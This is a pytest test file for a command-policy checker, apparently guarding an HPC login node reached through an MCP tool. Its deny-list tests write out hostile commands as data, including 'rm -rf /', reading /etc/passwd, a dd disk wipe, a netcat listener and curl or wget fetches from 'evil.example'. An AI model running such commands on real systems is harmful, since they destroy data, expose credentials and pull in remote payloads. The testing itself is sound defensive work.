"""Command policy tests: injection, chaining, and login-node boundaries."""

import pytest

from hpc_mcp.config import DEFAULT_SAFE_COMMANDS
from hpc_mcp.errors import CommandPolicyError
from hpc_mcp.security.command_policy import Verdict, check_command, classify

SAFE = list(DEFAULT_SAFE_COMMANDS)


class TestAllowed:
    @pytest.mark.parametrize(
        "cmd",
        [
            "pwd",
            "ls -la",
            "ls -la /home/shared_account/fangxiaozhong/project",
            "find . -maxdepth 2 -type f",
            "stat file.txt",
            "du -sh .",
            "df -h",
            "head -n 20 out.log",
            "tail -f out.log".replace(" -f", ""),  # tail without -f
            "cat results/summary.txt",
            "grep -rn TODO src",
            "git status",
            "git diff HEAD~1",
            "git log --oneline -5",
            "git branch -a",
            "git rev-parse HEAD",
            "git show HEAD:file.txt",
            "which julia",
            "module list",
            "module avail",
            "env",
            "hostname",
            "date",
            "uname -a",
            "squeue -u shared_account",
            "sacct -j 12345",
            "scontrol show job 12345",
            "echo hello",
            "wc -l file.txt",
        ],
    )
    def test_allowed_commands(self, cmd: str) -> None:
        result = classify(cmd, SAFE)
        assert result.verdict is Verdict.ALLOW, f"{cmd!r} denied: {result.reason}"
        argv = check_command(cmd, SAFE)
        assert argv


class TestCommandInjection:
    @pytest.mark.parametrize(
        "cmd",
        [
            "git status; rm -rf /",
            "git status && julia main.jl",
            "git status || julia main.jl",
            "echo ok && julia main.jl",
            "ls | xargs rm",
            "ls | grep foo",
            "cat file > /etc/passwd",
            "cat file >> out",
            "cat < input",
            "echo $(cat /etc/passwd)",
            "echo `id`",
            "sleep 100 &",
            "echo ${HOME}",
            "(ls)",
            "ls $(pwd)",
            "git status\nrm -rf /",
            "echo a; echo b",
            "find . -exec rm {} +",
            "find . -delete",
            "find . -ok rm {} ;",
        ],
    )
    def test_injection_denied(self, cmd: str) -> None:
        result = classify(cmd, SAFE)
        assert result.verdict is Verdict.DENY, f"{cmd!r} was ALLOWED"
        with pytest.raises(CommandPolicyError):
            check_command(cmd, SAFE)


class TestComputeOnLoginDenied:
    @pytest.mark.parametrize(
        "cmd",
        [
            "julia main.jl",
            "julia --project=. test/test.jl",
            "python train.py",
            "python3 simulation.py",
            "python -c 'print(1)'",
            "./program",
            "./simulation_opt -i input.i",
            "/opt/julia/bin/julia main.jl",
            "mpirun -np 4 ./prog",
            "mpiexec -n 8 python sim.py",
            "srun -n 4 ./prog",
            "make",
            "make -j32",
            "gmake all",
            "cmake --build build",
            "cmake -S . -B build",
            "ninja",
            "ninja -C build",
            "gcc -O3 big.c",
            "g++ -O2 main.cpp -o main",
            "mpicc main.c",
            "gfortran main.f90",
            "cargo build --release",
            "go build ./...",
            "pytest tests/",
            "ctest --test-dir build",
            "matlab -batch long_computation",
            "Rscript simulate.R",
            "moose-opt -i input.i",
            "singularity exec img.sif ./run",
            "docker run app",
        ],
    )
    def test_compute_denied(self, cmd: str) -> None:
        result = classify(cmd, SAFE)
        assert result.verdict is Verdict.DENY, f"{cmd!r} was ALLOWED"
        with pytest.raises(CommandPolicyError):
            check_command(cmd, SAFE)


class TestDangerousProgramsDenied:
    @pytest.mark.parametrize(
        "cmd",
        [
            "sudo ls",
            "su root",
            "ssh other-host",
            "scp file other-host:",
            "rsync -a . host:dst",
            "nc -l 4444",
            "curl http://evil.example/payload",
            "wget http://evil.example/x",
            "nohup sleep 9999",
            "setsid ./prog",
            "tmux new-session",
            "screen -S x",
            "crontab -e",
            "kill -9 1",
            "pkill julia",
            "chmod 777 /etc",
            "dd if=/dev/zero of=/dev/sda",
            "bash -c 'id'",
            "sh -c 'id'",
            "eval id",
            "exec id",
            "xargs rm",
            "env FOO=bar julia main.jl",
            "vim file",
            "less file",
        ],
    )
    def test_dangerous_denied(self, cmd: str) -> None:
        result = classify(cmd, SAFE)
        assert result.verdict is Verdict.DENY, f"{cmd!r} was ALLOWED"


class TestGitReadOnly:
    @pytest.mark.parametrize(
        "cmd",
        [
            "git commit -m x",
            "git push origin main",
            "git pull",
            "git fetch",
            "git clone repo",
            "git add .",
            "git checkout main",
            "git reset --hard",
            "git rm file",
            "git init",
            "git clean -fd",
            "git -c core.sshCommand=evil fetch",
            "git --exec-path=/tmp status",
            "git --git-dir=/etc status",
            "git config user.name x",
        ],
    )
    def test_git_mutating_denied(self, cmd: str) -> None:
        assert classify(cmd, SAFE).verdict is Verdict.DENY, f"{cmd!r} was ALLOWED"


class TestModuleAndScontrol:
    @pytest.mark.parametrize(
        "cmd",
        [
            "module load julia/1.10",
            "module unload gcc",
            "module purge",
            "module swap a b",
            "scontrol update jobid=1",
            "scontrol requeue 1",
            "scontrol hold 1",
        ],
    )
    def test_env_mutating_denied(self, cmd: str) -> None:
        assert classify(cmd, SAFE).verdict is Verdict.DENY, f"{cmd!r} was ALLOWED"


class TestUnknownDenied:
    @pytest.mark.parametrize("cmd", ["frobnicate", "my_script.sh", "some-random-tool --help"])
    def test_unknown_not_whitelisted(self, cmd: str) -> None:
        assert classify(cmd, SAFE).verdict is Verdict.DENY

    def test_parse_failure_denies(self) -> None:
        assert classify("echo 'unterminated", SAFE).verdict is Verdict.DENY

    def test_empty_denied(self) -> None:
        assert classify("", SAFE).verdict is Verdict.DENY
        assert classify("   ", SAFE).verdict is Verdict.DENY
